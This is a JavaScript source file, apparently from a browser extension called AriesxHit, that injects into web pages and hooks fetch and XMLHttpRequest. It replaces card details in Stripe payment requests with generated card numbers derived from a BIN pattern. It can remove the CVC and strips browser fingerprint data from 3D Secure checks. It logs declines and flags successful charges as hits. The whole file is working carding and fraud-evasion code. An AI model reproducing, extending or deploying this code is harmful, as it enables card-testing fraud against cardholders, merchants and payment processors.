// ===================================
// BYPASS.JS - Page Context Injection
// Intercepts fetch/XHR to modify Stripe requests
// NO DEBUGGER - Runs in page context
// ===================================

(function() {
  if (window.__ARIESXHIT_BYPASS__) return;
  window.__ARIESXHIT_BYPASS__ = true;

  // State from extension
  let bypassEnabled = false;
  let currentBin = '';
  let settings = {
    cvcModifier: 'generate',
    customCvc: '',
    remove3dsFingerprint: true
  };

  // Listen for settings from content script
  window.addEventListener('message', (event) => {
    if (event.data?.source !== 'ariesxhit-settings') return;
    
    if (event.data.type === 'UPDATE_STATE') {
      bypassEnabled = event.data.bypassEnabled || false;
      currentBin = event.data.bin || '';
      settings = event.data.settings || settings;
      console.log('[AriesxHit] State updated:', { bypassEnabled, currentBin, settings });
    }
  });

  // ==================== CARD GENERATOR ====================

  function generateCard(bin) {
    if (!bin) return null;
    
    const parts = bin.split('|');
    let pattern = parts[0].replace(/[^0-9xX]/g, '');
    const expMonth = parts[1]?.trim();
    const expYear = parts[2]?.trim();
    const cvvPattern = parts[3]?.trim();

    // Pad to 16
    if (pattern.length < 16) {
      pattern += 'x'.repeat(16 - pattern.length);
    }

    // Generate number
    let number = '';
    for (let i = 0; i < 16; i++) {
      const c = pattern[i];
      number += (c?.toLowerCase() === 'x') ? Math.floor(Math.random() * 10) : (c || Math.floor(Math.random() * 10));
    }

    // Fix Luhn
    const digits = number.split('').map(Number);
    let sum = 0;
    for (let i = 0; i < 15; i++) {
      let d = digits[i];
      if ((15 - i) % 2 === 1) { d *= 2; if (d > 9) d -= 9; }
      sum += d;
    }
    number = number.slice(0, 15) + ((10 - (sum % 10)) % 10);

    // Generate expiry
    const month = (expMonth && /^\d{1,2}$/.test(expMonth)) 
      ? expMonth.padStart(2, '0') 
      : (Math.floor(Math.random() * 12) + 1).toString().padStart(2, '0');
    
    const currentYear = new Date().getFullYear();
    let year;
    if (expYear && /^\d{2,4}$/.test(expYear)) {
      let y = parseInt(expYear);
      if (y < 100) y += 2000;
      year = (y % 100).toString().padStart(2, '0');
    } else {
      year = ((currentYear + Math.floor(Math.random() * 5) + 1) % 100).toString().padStart(2, '0');
    }

    // Generate CVV based on settings
    let cvv;
    switch (settings.cvcModifier) {
      case 'remove':
        cvv = '';
        break;
      case 'custom':
        cvv = settings.customCvc || Math.floor(100 + Math.random() * 900).toString();
        break;
      case 'nothing':
        cvv = cvvPattern || Math.floor(100 + Math.random() * 900).toString();
        break;
      case 'generate':
      default:
        cvv = Math.floor(100 + Math.random() * 900).toString();
    }

    return { number, month, year, cvv };
  }

  // ==================== SEND LOG TO EXTENSION ====================

  function sendLog(type, message) {
    window.postMessage({
      source: 'ariesxhit-bypass',
      type: 'LOG',
      logType: type,
      message: message
    }, '*');
  }

  // ==================== INTERCEPT FETCH ====================

  const originalFetch = window.fetch;
  window.fetch = async function(input, init) {
    const url = typeof input === 'string' ? input : input.url;
    
    // Check if Stripe payment request
    if (bypassEnabled && url.includes('stripe.com/v1/payment_methods') && init?.method === 'POST' && init?.body) {
      try {
        const card = generateCard(currentBin);
        if (card) {
          // Log trying card (yellow)
          const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
          sendLog('trying', `Trying Card :- ${cardStr}`);

          // Modify body
          let body = init.body;
          if (typeof body === 'string') {
            const params = new URLSearchParams(body);
            
            // Replace card data
            params.set('card[number]', card.number);
            params.set('card[exp_month]', card.month);
            params.set('card[exp_year]', card.year);
            
            if (settings.cvcModifier === 'remove') {
              params.delete('card[cvc]');
            } else {
              params.set('card[cvc]', card.cvv);
            }

            // Also handle payment_method_data format
            if (params.has('payment_method_data[card][number]')) {
              params.set('payment_method_data[card][number]', card.number);
              params.set('payment_method_data[card][exp_month]', card.month);
              params.set('payment_method_data[card][exp_year]', card.year);
              if (settings.cvcModifier === 'remove') {
                params.delete('payment_method_data[card][cvc]');
              } else {
                params.set('payment_method_data[card][cvc]', card.cvv);
              }
            }

            // 3DS bypass
            if (settings.remove3dsFingerprint) {
              for (const [key, value] of params) {
                if (key.includes('three_d_secure') && key.includes('device_data')) {
                  try {
                    let decoded = decodeURIComponent(value);
                    let obj = JSON.parse(atob(decoded));
                    delete obj.browser_locale;
                    delete obj.timezone;
                    delete obj.user_agent;
                    delete obj.screen_width;
                    delete obj.screen_height;
                    delete obj.color_depth;
                    params.set(key, encodeURIComponent(btoa(JSON.stringify(obj))));
                  } catch (e) {}
                }
              }
            }

            init.body = params.toString();
          }
        }
      } catch (e) {
        console.error('[AriesxHit] Fetch intercept error:', e);
      }
    }

    // Make request
    const response = await originalFetch.call(this, input, init);
    
    // Check response for Stripe
    if (url.includes('api.stripe.com') || url.includes('stripe.com/v1')) {
      try {
        const clone = response.clone();
        const data = await clone.json();
        processResponse(data);
      } catch (e) {}
    }

    return response;
  };

  // ==================== INTERCEPT XHR ====================

  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    this._method = method;
    return originalXHROpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function(body) {
    if (bypassEnabled && this._url?.includes('stripe.com/v1/payment_methods') && this._method === 'POST' && body) {
      try {
        const card = generateCard(currentBin);
        if (card) {
          const cardStr = `${card.number}|${card.month}|${card.year}|${card.cvv}`;
          sendLog('trying', `Trying Card :- ${cardStr}`);

          const params = new URLSearchParams(body);
          params.set('card[number]', card.number);
          params.set('card[exp_month]', card.month);
          params.set('card[exp_year]', card.year);
          
          if (settings.cvcModifier === 'remove') {
            params.delete('card[cvc]');
          } else {
            params.set('card[cvc]', card.cvv);
          }

          body = params.toString();
        }
      } catch (e) {}
    }

    // Listen for response
    this.addEventListener('load', function() {
      if (this._url?.includes('api.stripe.com') || this._url?.includes('stripe.com/v1')) {
        try {
          const data = JSON.parse(this.responseText);
          processResponse(data);
        } catch (e) {}
      }
    });

    return originalXHRSend.call(this, body);
  };

  // ==================== PROCESS RESPONSE ====================

  function processResponse(data) {
    // Check for 3DS
    if (data.status === 'requires_action' || data.next_action) {
      sendLog('warning', '🔐 3D Secure Required');
      return;
    }

    // Check for errors
    const error = data.error || data.payment_intent?.last_payment_error;
    if (error) {
      const code = error.decline_code || error.code || 'declined';
      const msg = error.message || 'Card declined';
      sendLog('error', `❌ ${code}: ${msg}`);
      return;
    }

    // Check for success
    const status = data.status?.toLowerCase();
    if (status === 'succeeded' || status === 'success') {
      sendLog('success', '✅ Payment Successful!');
      sendLog('success', '🎉 HIT DETECTED!');
    }
  }

  console.log('[AriesxHit] Bypass script loaded - fetch/XHR interception active');
})();
